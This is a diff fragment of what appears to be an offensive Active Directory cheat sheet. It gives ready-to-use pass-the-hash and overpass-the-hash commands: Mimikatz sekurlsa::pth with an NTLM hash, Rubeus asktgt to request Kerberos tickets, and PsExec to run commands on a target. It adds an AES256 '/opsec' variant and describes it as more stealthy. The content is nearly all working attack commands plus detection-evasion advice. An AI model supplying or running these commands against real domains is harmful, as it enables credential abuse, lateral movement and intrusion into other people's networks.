@@ -34,11 +34,14 @@ From Windows.
 # With Mimikatz.
 sekurlsa::pth /user:$username /domain:$domain /ntlm:$hash /run:powershell
 
-# TGT Kerberos ticket will be generated at this moment
+# TGT Kerberos ticket will be generated at this moment.
 net use \\$target
 
-# Another way to get the TGT is to use Rubeus.
-.\Rubeus.exe asktgt /domain:$domain /user:$username /rc4:$hash /ptt
+# Using Rubeus (add /ptt if you directly want to inject the ticket in your current session).
+.\Rubeus.exe asktgt /domain:$domain /user:$username /rc4:$hash /nowrap
+
+# More stealthy since RC4 is deprecated.
+.\Rubeus.exe asktgt /domain:$domain /user:$username /aes256:$hash /opsec /nowrap
 
 # Now you can use PsExec.
 .\PsExec.exe \\$target $cmd
